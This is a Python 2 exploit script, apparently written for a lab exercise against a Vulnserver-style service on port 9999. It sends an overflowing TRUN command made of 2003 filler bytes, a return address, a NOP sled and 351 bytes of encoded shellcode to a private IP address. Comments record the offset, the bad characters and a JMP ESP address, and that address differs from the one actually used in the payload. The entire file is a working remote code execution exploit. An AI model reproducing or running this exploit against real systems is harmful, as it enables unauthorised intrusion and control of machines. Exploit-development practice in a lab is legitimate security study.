#!/usr/bin/python

import sys, socket

ip = "192.168.82.128"
port = 9999

try:
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((ip, port))
	print "[*] Connection successful"
except:
	print "[!] Connection failed.  Exiting..."
	sys.exit(1)

# Payload size = 351 bytes
shellcode = (
"\xd9\xc8\xb8\x32\x9f\xc8\xed\xd9\x74\x24\xf4\x5d\x29\xc9\xb1"
"\x52\x31\x45\x17\x83\xed\xfc\x03\x77\x8c\x2a\x18\x8b\x5a\x28"
"\xe3\x73\x9b\x4d\x6d\x96\xaa\x4d\x09\xd3\x9d\x7d\x59\xb1\x11"
"\xf5\x0f\x21\xa1\x7b\x98\x46\x02\x31\xfe\x69\x93\x6a\xc2\xe8"
"\x17\x71\x17\xca\x26\xba\x6a\x0b\x6e\xa7\x87\x59\x27\xa3\x3a"
"\x4d\x4c\xf9\x86\xe6\x1e\xef\x8e\x1b\xd6\x0e\xbe\x8a\x6c\x49"
"\x60\x2d\xa0\xe1\x29\x35\xa5\xcc\xe0\xce\x1d\xba\xf2\x06\x6c"
"\x43\x58\x67\x40\xb6\xa0\xa0\x67\x29\xd7\xd8\x9b\xd4\xe0\x1f"
"\xe1\x02\x64\xbb\x41\xc0\xde\x67\x73\x05\xb8\xec\x7f\xe2\xce"
"\xaa\x63\xf5\x03\xc1\x98\x7e\xa2\x05\x29\xc4\x81\x81\x71\x9e"
"\xa8\x90\xdf\x71\xd4\xc2\xbf\x2e\x70\x89\x52\x3a\x09\xd0\x3a"
"\x8f\x20\xea\xba\x87\x33\x99\x88\x08\xe8\x35\xa1\xc1\x36\xc2"
"\xc6\xfb\x8f\x5c\x39\x04\xf0\x75\xfe\x50\xa0\xed\xd7\xd8\x2b"
"\xed\xd8\x0c\xfb\xbd\x76\xff\xbc\x6d\x37\xaf\x54\x67\xb8\x90"
"\x45\x88\x12\xb9\xec\x73\xf5\x06\x58\x29\x84\xef\x9b\xcd\x87"
"\x54\x12\x2b\xed\xba\x73\xe4\x9a\x23\xde\x7e\x3a\xab\xf4\xfb"
"\x7c\x27\xfb\xfc\x33\xc0\x76\xee\xa4\x20\xcd\x4c\x62\x3e\xfb"
"\xf8\xe8\xad\x60\xf8\x67\xce\x3e\xaf\x20\x20\x37\x25\xdd\x1b"
"\xe1\x5b\x1c\xfd\xca\xdf\xfb\x3e\xd4\xde\x8e\x7b\xf2\xf0\x56"
"\x83\xbe\xa4\x06\xd2\x68\x12\xe1\x8c\xda\xcc\xbb\x63\xb5\x98"
"\x3a\x48\x06\xde\x42\x85\xf0\x3e\xf2\x70\x45\x41\x3b\x15\x41"
"\x3a\x21\x85\xae\x91\xe1\xb5\xe4\xbb\x40\x5e\xa1\x2e\xd1\x03"
"\x52\x85\x16\x3a\xd1\x2f\xe7\xb9\xc9\x5a\xe2\x86\x4d\xb7\x9e"
"\x97\x3b\xb7\x0d\x97\x69")

# Buffer size: 5005 bytes
# [*] Exact match at offset 2003
# Bad characters: \x00
# JMP ESP: 0x77490BB3

evil = "\x41" * 2003 + "\xAF\x11\x50\x62" + "\x90" * 16 + shellcode + "\x43" * (5005 - 2003 - 4 - 16 - len(shellcode))

buffer = "TRUN /.:/" + evil + "\r\n"

s.recv(1024)
s.send(buffer)
s.close()
print "[*] Payload sent"
